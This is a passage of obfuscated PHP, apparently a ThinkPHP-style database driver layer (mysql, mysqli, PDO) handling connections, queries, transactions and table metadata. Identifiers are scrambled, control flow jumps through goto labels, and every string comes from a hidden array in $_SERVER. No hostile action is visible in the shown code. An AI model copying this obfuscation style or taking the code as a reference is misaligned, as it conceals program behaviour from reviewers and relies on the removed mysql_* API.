$Eƒ˜µÏöéÍ[801]); } if (!empty($Bîğ±»ù…œ)) { $this->config = $Bîğ±»ù…œ; if (empty($this->config[$Eƒ˜µÏöéÍ[13]])) { $this->config[$Eƒ˜µÏöéÍ[13]] = $Eƒ˜µÏöéÍ[33]; } } } public function connect($aÀÀñÙœ = '', $d”± …Š¦ª = 0, $F¹ø£†¼ì‡ = false) { $f£ÖàœÀå´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($this->linkID[$d”± …Š¦ª])) { goto e•¸×áÖö¼; F¤´ˆˆ„Íõ: if ($B‰Ú†§°Õ) { $this->linkID[$d”± …Š¦ª] = mysql_pconnect($F¼Ë±º‰Ì’, $aÀÀñÙœ[$f£ÖàœÀå´[804]], $aÀÀñÙœ[$f£ÖàœÀå´[805]], 131072); } else { $this->linkID[$d”± …Š¦ª] = mysql_connect($F¼Ë±º‰Ì’, $aÀÀñÙœ[$f£ÖàœÀå´[804]], $aÀÀñÙœ[$f£ÖàœÀå´[805]], !0, 131072); } if (!$this->linkID[$d”± …Š¦ª] || !empty($aÀÀñÙœ[$f£ÖàœÀå´[17]]) && !mysql_select_db($aÀÀñÙœ[$f£ÖàœÀå´[17]], $this->linkID[$d”± …Š¦ª])) { think_exception(mysql_error()); } $bÜ÷É‚²Èº = mysql_get_server_info($this->linkID[$d”± …Š¦ª]); goto aî…ÍÁ±Û; EÊØÎñöé©: if (1 != think_config($f£ÖàœÀå´[18])) { unset($this->config); } goto C»˜Í„«´; e•¸×áÖö¼: if (empty($aÀÀñÙœ)) { $aÀÀñÙœ = $this->config; } $F¼Ë±º‰Ì’ = $aÀÀñÙœ[$f£ÖàœÀå´[802]] . ($aÀÀñÙœ[$f£ÖàœÀå´[803]] ? "\x3a{$aÀÀñÙœ[$f£ÖàœÀå´[803]]}" : $f£ÖàœÀå´[33]); $B‰Ú†§°Õ = !empty($aÀÀñÙœ[$f£ÖàœÀå´[13]][$f£ÖàœÀå´[14]]) ? $aÀÀñÙœ[$f£ÖàœÀå´[13]][$f£ÖàœÀå´[14]] : $this->pconnect; goto F¤´ˆˆ„Íõ; aî…ÍÁ±Û: mysql_query($f£ÖàœÀå´[806] . think_config($f£ÖàœÀå´[807]) . $f£ÖàœÀå´[55], $this->linkID[$d”± …Š¦ª]); if ($bÜ÷É‚²Èº > $f£ÖàœÀå´[808]) { mysql_query($f£ÖàœÀå´[809], $this->linkID[$d”± …Š¦ª]); } $this->connected = !0; goto EÊØÎñöé©; C»˜Í„«´: } return $this->linkID[$d”± …Š¦ª]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aÅª¢Ó¢÷•) { goto eÄœ½’Æ„®; C£¦¥¿ğªõ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bÊ›¹‰Ğ•; eÄœ½’Æ„®: $F‹ÎŸ¥·È´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (0 === stripos($aÅª¢Ó¢÷•, $F‹ÎŸ¥·È´[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto cÃ‚Æ‘è˜Ş; cˆ¡÷İÏÓ: think_action_status($F‹ÎŸ¥·È´[19], 1); think_status($F‹ÎŸ¥·È´[20]); $this->queryID = mysql_query($aÅª¢Ó¢÷•, $this->_linkID); goto C£¦¥¿ğªõ; cÃ‚Æ‘è˜Ş: if (!$this->_linkID) { return !1; } $this->queryStr = $aÅª¢Ó¢÷•; if ($this->queryID) { $this->free(); } goto cˆ¡÷İÏÓ; bÊ›¹‰Ğ•: } public function execute($Eªâ£¨ÕË) { goto e“½²¸¢‚‡; f…Œì¶ñŸÔ: if (!1 === $d˜ğç„¥…¤) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Aµ„ë–èÇ; dŒÕ½Ä•­œ: $this->queryStr = $Eªâ£¨ÕË; if ($this->queryID) { $this->free(); } think_action_status($d¾ƒÜ³éĞ´[21], 1); goto Báù·´òŠ×; Báù·´òŠ×: think_status($d¾ƒÜ³éĞ´[20]); $d˜ğç„¥…¤ = mysql_query($Eªâ£¨ÕË, $this->_linkID); $this->debug(); goto f…Œì¶ñŸÔ; e“½²¸¢‚‡: $d¾ƒÜ³éĞ´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dŒÕ½Ä•­œ; Aµ„ë–èÇ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[´Ù×Íå‘ÄõÛ][810], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¾Î¤ç¡¼‰ = mysql_query($_SERVER[´Ù×Íå‘ÄõÛ][811], $this->_linkID); $this->transTimes = 0; if (!$C¾Î¤ç¡¼‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C¥è”ŞÑ¾› = mysql_query($_SERVER[´Ù×Íå‘ÄõÛ][812], $this->_linkID); $this->transTimes = 0; if (!$C¥è”ŞÑ¾›) { $this->error(); return !1; } } return !0; } private function getAll() { $fÄÓÌ‘ ¸Å = array(); if ($this->numRows > 0) { while ($a§×Šê‘÷á = mysql_fetch_assoc($this->queryID)) { $fÄÓÌ‘ ¸Å[] = $a§×Šê‘÷á; } mysql_data_seek($this->queryID, 0); } return $fÄÓÌ‘ ¸Å; } public function getFields($fÃºëÖâ­ù) { $cø¡Ø°Ğ›Ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d²˜¹­õ³è = $this->query($cø¡Ø°Ğ›Ù[813] . $this->parseKey($fÃºëÖâ­ù)); $B×ö¡áŒ = array(); if ($d²˜¹­õ³è) { foreach ($d²˜¹­õ³è as $c±èéæˆœÌ => $bç¥Ö×“Ÿ) { $B×ö¡áŒ[$bç¥Ö×“Ÿ[$cø¡Ø°Ğ›Ù[27]]] = array($cø¡Ø°Ğ›Ù[28] => $bç¥Ö×“Ÿ[$cø¡Ø°Ğ›Ù[27]], $cø¡Ø°Ğ›Ù[29] => $bç¥Ö×“Ÿ[$cø¡Ø°Ğ›Ù[30]], $cø¡Ø°Ğ›Ù[31] => (bool) (strtoupper($bç¥Ö×“Ÿ[$cø¡Ø°Ğ›Ù[32]]) === $cø¡Ø°Ğ›Ù[814]), $cø¡Ø°Ğ›Ù[34] => $bç¥Ö×“Ÿ[$cø¡Ø°Ğ›Ù[35]], $cø¡Ø°Ğ›Ù[36] => strtolower($bç¥Ö×“Ÿ[$cø¡Ø°Ğ›Ù[37]]) == $cø¡Ø°Ğ›Ù[38], $cø¡Ø°Ğ›Ù[39] => strtolower($bç¥Ö×“Ÿ[$cø¡Ø°Ğ›Ù[40]]) == $cø¡Ø°Ğ›Ù[41]); } } return $B×ö¡áŒ; } public function getTables($EŞº·¼Ğ = '') { $FÌïİ°ø÷Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!empty($EŞº·¼Ğ)) { $c´çŸçàã¼ = $FÌïİ°ø÷Ä[815] . $EŞº·¼Ğ; } else { $c´çŸçàã¼ = $FÌïİ°ø÷Ä[816]; } $AÊğ¾…İˆÉ = $this->query($c´çŸçàã¼); $E±Ş§àÇ×– = array(); foreach ($AÊğ¾…İˆÉ as $Eæà•ŠôôÁ => $FŒÏ«îïÍó) { $E±Ş§àÇ×–[$Eæà•ŠôôÁ] = current($FŒÏ«îïÍó); } return $E±Ş§àÇ×–; } public function replace($B¦“‰ùùôˆ, $dâÁœßàÖ = array()) { $Cˆ“–»—Éº =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($B¦“‰ùùôˆ as $d‡ò¸à¶õ => $D¬ÓÕùÌ³Ò) { $bƒ×Ì«¦êõ = $this->parseValue($D¬ÓÕùÌ³Ò); if (is_scalar($bƒ×Ì«¦êõ)) { $cØ¾‘óÑî‰[] = $bƒ×Ì«¦êõ; $CØéÉÁ[] = $this->parseKey($d‡ò¸à¶õ); } } $E†Ç—ô®—Ê = $Cˆ“–»—Éº[817] . $this->parseTable($dâÁœßàÖ[$Cˆ“–»—Éº[267]]) . $Cˆ“–»—Éº[818] . implode($Cˆ“–»—Éº[47], $CØéÉÁ) . $Cˆ“–»—Éº[819] . implode($Cˆ“–»—Éº[47], $cØ¾‘óÑî‰) . $Cˆ“–»—Éº[820]; return $this->execute($E†Ç—ô®—Ê); } public function insertAll($A–¾Ş·, $d°´ÁÓöÃ = array(), $EŒĞÃİ‰ø = false) { goto Eï©ØØ°·Ù; E»ôœÊïÏ: $DöĞ÷¬ÒÇÁ = array(); foreach ($A–¾Ş· as $E§‹•ÜøË«) { $CÅ¨ÆË»–Ø = array(); foreach ($E§‹•ÜøË« as $BÙÀ¹¡†—× => $Eõ˜„÷œ) { $Eõ˜„÷œ = $this->parseValue($Eõ˜„÷œ); if (is_scalar($Eõ˜„÷œ)) { $CÅ¨ÆË»–Ø[] = $Eõ˜„÷œ; } } $DöĞ÷¬ÒÇÁ[] = $EíÉæ³ï¨[248] . implode($EíÉæ³ï¨[47], $CÅ¨ÆË»–Ø) . $EíÉæ³ï¨[820]; } array_walk($EÈŠôßÁ±, array($this, $EíÉæ³ï¨[821])); goto B¤¢¼ô…–; Eï©ØØ°·Ù: $EíÉæ³ï¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!is_array($A–¾Ş·[0])) { return !1; } $EÈŠôßÁ± = array_keys($A–¾Ş·[0]); goto E»ôœÊïÏ; B¤¢¼ô…–: $e„Ûµ¶ÃÕÂ = ($EŒĞÃİ‰ø ? $EíÉæ³ï¨[822] : $EíÉæ³ï¨[823]) . $EíÉæ³ï¨[824] . $this->parseTable($d°´ÁÓöÃ[$EíÉæ³ï¨[267]]) . $EíÉæ³ï¨[818] . implode($EíÉæ³ï¨[47], $EÈŠôßÁ±) . $EíÉæ³ï¨[825] . implode($EíÉæ³ï¨[47], $DöĞ÷¬ÒÇÁ); return $this->execute($e„Ûµ¶ÃÕÂ); goto EÊğˆÓ‰²; EÊğˆÓ‰²: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $AŸÔö«Û¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->error = mysql_errno() . $AŸÔö«Û¯[4] . mysql_error($this->_linkID); if ($AŸÔö«Û¯[33] != $this->queryStr) { $this->error .= LNG($AŸÔö«Û¯[45]) . $this->queryStr; } think_trace($this->error, $AŸÔö«Û¯[33], $AŸÔö«Û¯[46]); return $this->error; } public function escapeString($e¡’‰¥ªø´) { if ($this->_linkID) { return mysql_real_escape_string($e¡’‰¥ªø´, $this->_linkID); } else { return mysql_escape_string($e¡’‰¥ªø´); } } public function parseKey(&$D¨¯µÇÎø, $DÀ›êÍ†¶ = true) { $b‰ÑšâîÎ© =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($DÀ›êÍ†¶) { $D¨¯µÇÎø = $this->parseKeyCheck($D¨¯µÇÎø); } if ($D¨¯µÇÎø != $b‰ÑšâîÎ©[176] && !preg_match($b‰ÑšâîÎ©[826], $D¨¯µÇÎø)) { $D¨¯µÇÎø = $b‰ÑšâîÎ©[827] . trim($D¨¯µÇÎø, $b‰ÑšâîÎ©[827]) . $b‰ÑšâîÎ©[827]; } return $D¨¯µÇÎø; } } class DbMysqli extends Db { public function __construct($eè½¼—”ØÃ = '') { $fÛ¦Ó¦–óá =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!extension_loaded($fÛ¦Ó¦–óá[727])) { think_exception(think_lang($fÛ¦Ó¦–óá[10]) . $fÛ¦Ó¦–óá[828]); } if (!empty($eè½¼—”ØÃ)) { $this->config = $eè½¼—”ØÃ; if (empty($this->config[$fÛ¦Ó¦–óá[13]])) { $this->config[$fÛ¦Ó¦–óá[13]] = $fÛ¦Ó¦–óá[33]; } } } public function connect($AÀİ½Ï‘œ = '', $Ağ’ÕÙè = 0) { $BŞˆÅ×ê‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($this->linkID[$Ağ’ÕÙè])) { goto D­â‡ÁÎçğ; d‘¯åòµ¾¡: $this->connected = !0; if (1 != think_config($BŞˆÅ×ê‰[18])) { unset($this->config); } goto cÂ´šÛ–‡; dëÜ£¦ìè°: $f·’†äİáè = $this->linkID[$Ağ’ÕÙè]->server_version; $this->linkID[$Ağ’ÕÙè]->query($BŞˆÅ×ê‰[806] . think_config($BŞˆÅ×ê‰[807]) . $BŞˆÅ×ê‰[55]); if ($f·’†äİáè > $BŞˆÅ×ê‰[808]) { $this->linkID[$Ağ’ÕÙè]->query($BŞˆÅ×ê‰[809]); } goto d‘¯åòµ¾¡; D­â‡ÁÎçğ: if (empty($AÀİ½Ï‘œ)) { $AÀİ½Ï‘œ = $this->config; } $this->linkID[$Ağ’ÕÙè] = new mysqli($AÀİ½Ï‘œ[$BŞˆÅ×ê‰[802]], $AÀİ½Ï‘œ[$BŞˆÅ×ê‰[804]], $AÀİ½Ï‘œ[$BŞˆÅ×ê‰[805]], $AÀİ½Ï‘œ[$BŞˆÅ×ê‰[17]], $AÀİ½Ï‘œ[$BŞˆÅ×ê‰[803]] ? intval($AÀİ½Ï‘œ[$BŞˆÅ×ê‰[803]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto dëÜ£¦ìè°; cÂ´šÛ–‡: } return $this->linkID[$Ağ’ÕÙè]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($fÙ•ÕÏï£•) { goto eßÆ„à‚ˆÀ; dæœùòÓ¯¤: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto EÕƒ®ÙØŞ; cÒôšˆ¿: think_status($dª’Î‹¹ˆ‹[20]); $this->queryID = $this->_linkID->query($fÙ•ÕÏï£•); if ($this->_linkID->more_results()) { while (($bëÖ‚º„¾… = $this->_linkID->next_result()) != NULL) { $bëÖ‚º„¾…->free_result(); } } goto dæœùòÓ¯¤; F×Õìë¾÷ğ: $this->queryStr = $fÙ•ÕÏï£•; if ($this->queryID) { $this->free(); } think_action_status($dª’Î‹¹ˆ‹[19], 1); goto cÒôšˆ¿; eßÆ„à‚ˆÀ: $dª’Î‹¹ˆ‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F×Õìë¾÷ğ; EÕƒ®ÙØŞ: } public function execute($E‡ª£ô”¨¸) { goto f‘¾®‘±œİ; f‘¾®‘±œİ: $EíöîƒİŠ© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eŒŒÛ°³‚œ; cœçæ¼¸Œ: think_status($EíöîƒİŠ©[20]); $Díî÷ Á®™ = $this->_linkID->query($E‡ª£ô”¨¸); $this->debug(); goto a¶‹›ç‚±ä; eŒŒÛ°³‚œ: $this->queryStr = $E‡ª£ô”¨¸; if ($this->queryID) { $this->free(); } think_action_status($EíöîƒİŠ©[21], 1); goto cœçæ¼¸Œ; a¶‹›ç‚±ä: if (!1 === $Díî÷ Á®™) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aëÎÜö…¶¯; aëÎÜö…¶¯: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EøÜ¡­­ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$EøÜ¡­­) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÖ…ÂÎÓ›‘ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$BÖ…ÂÎÓ›‘) { $this->error(); return !1; } } return !0; } private function getAll() { $Däì¡°é¨‘ = array(); if ($this->numRows > 0) { for ($FáŠÊ›„´é = 0; $FáŠÊ›„´é < $this->numRows; $FáŠÊ›„´é++) { $Däì¡°é¨‘[$FáŠÊ›„´é] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Däì¡°é¨‘; } public function getFields($F±Ÿ¢çÆ¢Ÿ) { $EàÚĞˆ”¬« =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A¢Ó¼¯š‚ = $this->query($EàÚĞˆ”¬«[813] . $this->parseKey($F±Ÿ¢çÆ¢Ÿ)); $BŞÑõ…ŒÍì = array(); if ($A¢Ó¼¯š‚) { foreach ($A¢Ó¼¯š‚ as $Eòó¤ìŒµŠ => $BŸšğš°Ù) { $BŞÑõ…ŒÍì[$BŸšğš°Ù[$EàÚĞˆ”¬«[27]]] = array($EàÚĞˆ”¬«[28] => $BŸšğš°Ù[$EàÚĞˆ”¬«[27]], $EàÚĞˆ”¬«[29] => $BŸšğš°Ù[$EàÚĞˆ”¬«[30]], $EàÚĞˆ”¬«[31] => (bool) ($BŸšğš°Ù[$EàÚĞˆ”¬«[32]] === $EàÚĞˆ”¬«[33]), $EàÚĞˆ”¬«[34] => $BŸšğš°Ù[$EàÚĞˆ”¬«[35]], $EàÚĞˆ”¬«[36] => strtolower($BŸšğš°Ù[$EàÚĞˆ”¬«[37]]) == $EàÚĞˆ”¬«[38], $EàÚĞˆ”¬«[39] => strtolower($BŸšğš°Ù[$EàÚĞˆ”¬«[40]]) == $EàÚĞˆ”¬«[41]); } } return $BŞÑõ…ŒÍì; } public function getTables($aÑÒ™‰± ¶ = '') { $cõŠîÒ£ù¿ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Eñë«ùŞä = !empty($aÑÒ™‰± ¶) ? $cõŠîÒ£ù¿[815] . $aÑÒ™‰± ¶ : $cõŠîÒ£ù¿[816]; $f¦¨‘ÙŒÅ© = $this->query($Eñë«ùŞä); $F©µ¼í°Åè = array(); if ($f¦¨‘ÙŒÅ©) { foreach ($f¦¨‘ÙŒÅ© as $CƒÍÌ é— => $Dä²¾´¡õŞ) { $F©µ¼í°Åè[$CƒÍÌ é—] = current($Dä²¾´¡õŞ); } } return $F©µ¼í°Åè; } public function replace($eÁ¼†è¡ ì, $c¨ñĞ»ì = array()) { $eõšóÊì‚œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($eÁ¼†è¡ ì as $aÏ˜„µù­Î => $f´ä‰„¼¸ ) { $B–’¼ÛŸÔš = $this->parseValue($f´ä‰„¼¸ ); if (is_scalar($B–’¼ÛŸÔš)) { $Aòšøö[] = $B–’¼ÛŸÔš; $eÉÚÍŸË²„[] = $this->parseKey($aÏ˜„µù­Î); } } $FÖÙ¸Ö×ù´ = $eõšóÊì‚œ[817] . $this->parseTable($c¨ñĞ»ì[$eõšóÊì‚œ[267]]) . $eõšóÊì‚œ[818] . implode($eõšóÊì‚œ[47], $eÉÚÍŸË²„) . $eõšóÊì‚œ[819] . implode($eõšóÊì‚œ[47], $Aòšøö) . $eõšóÊì‚œ[820]; return $this->execute($FÖÙ¸Ö×ù´); } public function insertAll($Fƒ“ëÆ†‡¬, $f«ƒ ÄÃ› = array(), $a²‚‘¿‘‰ = false) { goto Aİœ™‘†ƒ¸; fµøìÖÉÀ²: $EÚ…ö¦ƒÓê = array(); foreach ($Fƒ“ëÆ†‡¬ as $F™Ò²«õ«¬) { $D—ùĞİîÀí = array(); foreach ($F™Ò²«õ«¬ as $a”ïÍ¹ÆÑì => $Aø•ÌİÔ£ç) { $Aø•ÌİÔ£ç = $this->parseValue($Aø•ÌİÔ£ç); if (is_scalar($Aø•ÌİÔ£ç)) { $D—ùĞİîÀí[] = $Aø•ÌİÔ£ç; } } $EÚ…ö¦ƒÓê[] = $c”ØÎ›­„«[248] . implode($c”ØÎ›­„«[47], $D—ùĞİîÀí) . $c”ØÎ›­„«[820]; } array_walk($BàßÓñÛŸñ, array($this, $c”ØÎ›­„«[821])); goto f™õ»¬½ó; Aİœ™‘†ƒ¸: $c”ØÎ›­„« =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!is_array($Fƒ“ëÆ†‡¬[0])) { return !1; } $BàßÓñÛŸñ = array_keys($Fƒ“ëÆ†‡¬[0]); goto fµøìÖÉÀ²; f™õ»¬½ó: $e·°Ñ¬²©« = ($a²‚‘¿‘‰ ? $c”ØÎ›­„«[822] : $c”ØÎ›­„«[823]) . $c”ØÎ›­„«[824] . $this->parseTable($f«ƒ ÄÃ›[$c”ØÎ›­„«[267]]) . $c”ØÎ›­„«[818] . implode($c”ØÎ›­„«[47], $BàßÓñÛŸñ) . $c”ØÎ›­„«[825] . implode($c”ØÎ›­„«[47], $EÚ…ö¦ƒÓê); return $this->execute($e·°Ñ¬²©«); goto A¬èï»§Ÿ¢; A¬èï»§Ÿ¢: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÁÔÒ¸Âì´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->error = $this->_linkID->errno . $dÁÔÒ¸Âì´[4] . $this->_linkID->error; if ($dÁÔÒ¸Âì´[33] != $this->queryStr) { $this->error .= LNG($dÁÔÒ¸Âì´[45]) . $this->queryStr; } think_trace($this->error, $dÁÔÒ¸Âì´[33], $dÁÔÒ¸Âì´[46]); return $this->error; } public function escapeString($C†®åœùóª) { if ($this->_linkID) { return $this->_linkID->real_escape_string($C†®åœùóª); } else { return addslashes($C†®åœùóª); } } public function parseKey(&$d„Œ°ÊÅ, $bÁ…ãÎèÚÁ = true) { $còİ‡´†¹‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($bÁ…ãÎèÚÁ) { $d„Œ°ÊÅ = $this->parseKeyCheck($d„Œ°ÊÅ); } if ($d„Œ°ÊÅ != $còİ‡´†¹‡[176] && !preg_match($còİ‡´†¹‡[826], $d„Œ°ÊÅ)) { $d„Œ°ÊÅ = $còİ‡´†¹‡[827] . trim($d„Œ°ÊÅ, $còİ‡´†¹‡[827]) . $còİ‡´†¹‡[827]; } return $d„Œ°ÊÅ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($aŠ³”Œ³ï“ = '') { $båŒ”Œ„¯¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!class_exists($båŒ”Œ„¯¨[829])) { think_exception(think_lang($båŒ”Œ„¯¨[10]) . $båŒ”Œ„¯¨[830]); } if (!empty($aŠ³”Œ³ï“)) { $this->config = $aŠ³”Œ³ï“; if (empty($this->config[$båŒ”Œ„¯¨[13]])) { $this->config[$båŒ”Œ„¯¨[13]] = array(); } } } public function connect($Dòè„Œõ¨‚ = '', $DÀ‡æ‘„ĞÏ = 0) { $Aœ¿……Î— =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($this->linkID[$DÀ‡æ‘„ĞÏ])) { goto B°Ù¤˜‘‹ª; B§‡Ùš–—Ù: $this->dbType = $this->_getDsnType($Dòè„Œõ¨‚[$Aœ¿……Î—[831]]); if (in_array($this->dbType, array($Aœ¿……Î—[832], $Aœ¿……Î—[833], $Aœ¿……Î—[834], $Aœ¿……Î—[835]))) { think_exception($Aœ¿……Î—[836] . $this->dbType . $Aœ¿……Î—[837] . $this->dbType . $Aœ¿……Î—[838]); } if (!$this->linkID[$DÀ‡æ‘„ĞÏ]) { think_exception($Aœ¿……Î—[839]); } goto C¿Æ¿Üºªæ; C¿Æ¿Üºªæ: $this->linkID[$DÀ‡æ‘„ĞÏ]->exec($Aœ¿……Î—[840] . think_config($Aœ¿……Î—[807])); $this->connected = !0; if (1 != think_config($Aœ¿……Î—[18])) { unset($this->config); } goto eÃæëİ®Î; B°Ù¤˜‘‹ª: if (empty($Dòè„Œõ¨‚)) { $Dòè„Œõ¨‚ = $this->config; } if ($this->pconnect) { $Dòè„Œõ¨‚[$Aœ¿……Î—[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$DÀ‡æ‘„ĞÏ] = new PDO($Dòè„Œõ¨‚[$Aœ¿……Î—[831]], $Dòè„Œõ¨‚[$Aœ¿……Î—[804]], $Dòè„Œõ¨‚[$Aœ¿……Î—[805]], $Dòè„Œõ¨‚[$Aœ¿……Î—[13]]); } catch (PDOException $fóƒƒÍ„’¼) { think_exception($fóƒƒÍ„’¼->getMessage()); } goto B§‡Ùš–—Ù; eÃæëİ®Î: } return $this->linkID[$DÀ‡æ‘„ĞÏ]; } public function free() { $this->PDOStatement = null; } public function query($fªÊÕ‚ÌŸ’, $d¬‘Â¥Û¬ó = array()) { goto AÍ‡áô¹ô; f’‚ ¡’Á½: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $DÛ±·Œ¦ƒÕ = $this->PDOStatement->execute($d¬‘Â¥Û¬ó); $this->debug(); goto CŸ¤ê¾Ì”²; eŸ™ÔÔ¢î¤: $this->queryStr = $fªÊÕ‚ÌŸ’; if (!empty($d¬‘Â¥Û¬ó)) { $this->queryStr .= $fÄè³¤¹œé[841] . print_r($d¬‘Â¥Û¬ó, !0) . $fÄè³¤¹œé[842]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Cô˜†ÕËÉ; AÍ‡áô¹ô: $fÄè³¤¹œé =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eŸ™ÔÔ¢î¤; CŸ¤ê¾Ì”²: if (!1 === $DÛ±·Œ¦ƒÕ) { $this->error(); return !1; } else { return $this->getAll(); } goto dÈìÜ¾ä¹¸; Cô˜†ÕËÉ: think_action_status($fÄè³¤¹œé[19], 1); think_status($fÄè³¤¹œé[20]); $this->PDOStatement = $this->_linkID->prepare($fªÊÕ‚ÌŸ’); goto f’‚ ¡’Á½; dÈìÜ¾ä¹¸: } public function execute($B¯™…İ·›ê, $fŞ«…²¡æö = array()) { goto c‚‘Ò•Êò; EÑÎ ô·†‘: if ($this->dbType == $bÁ»ğ²¢³¦[835]) { if (preg_match($bÁ»ğ²¢³¦[843], $this->queryStr, $CÅ¯™“¨Ù˜)) { $this->table = think_config($bÁ»ğ²¢³¦[844]) . str_ireplace(think_config($bÁ»ğ²¢³¦[845]), $bÁ»ğ²¢³¦[361], $CÅ¯™“¨Ù˜[2]); $Bß‚¦ååàÛ = (bool) $this->query($bÁ»ğ²¢³¦[846] . strtoupper($this->table) . $bÁ»ğ²¢³¦[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($bÁ»ğ²¢³¦[21], 1); goto e›‰·äºª‘; bÁœãçÙÕµ: $fƒ§Ô¸¿÷ = $this->PDOStatement->execute($fŞ«…²¡æö); $this->debug(); if (!1 === $fƒ§Ô¸¿÷) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Bß‚¦ååàÛ || preg_match($bÁ»ğ²¢³¦[847], $B¯™…İ·›ê)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto C©²¨ »¦Ã; c‚‘Ò•Êò: $bÁ»ğ²¢³¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F˜ÍÊ¨¨ƒ£; F˜ÍÊ¨¨ƒ£: $this->queryStr = $B¯™…İ·›ê; if (!empty($fŞ«…²¡æö)) { $this->queryStr .= $bÁ»ğ²¢³¦[841] . print_r($fŞ«…²¡æö, !0) . $bÁ»ğ²¢³¦[842]; } $Bß‚¦ååàÛ = !1; goto EÑÎ ô·†‘; e›‰·äºª‘: think_status($bÁ»ğ²¢³¦[20]); $this->PDOStatement = $this->_linkID->prepare($B¯™…İ·›ê); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto bÁœãçÙÕµ; C©²¨ »¦Ã: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EŠÙ¡Ä£î» = $this->_linkID->commit(); $this->transTimes = 0; if (!$EŠÙ¡Ä£î») { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aõ‚‘îËÀˆ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aõ‚‘îËÀˆ) { $this->error(); return !1; } } return !0; } private function getAll() { $d“­¥ƒÚê = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($d“­¥ƒÚê); return $d“­¥ƒÚê; } public function getFields($fÔÉ—Ú¾èƒ) { goto Côóƒˆ™êã; C§Ï˜¾‰ï: return $EÏ’Ôƒ…Ù; goto eª›®ÚÕ°¾; Côóƒˆ™êã: $C¥ç‘Åœ’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!0); if (think_config($C¥ç‘Åœ’[848])) { $EÕ¦‹šØì‡ = str_replace($C¥ç‘Åœ’[849], $fÔÉ—Ú¾èƒ, think_config($C¥ç‘Åœ’[848])); } else { switch ($this->dbType) { case $C¥ç‘Åœ’[832]: case $C¥ç‘Åœ’[850]: $EÕ¦‹šØì‡ = 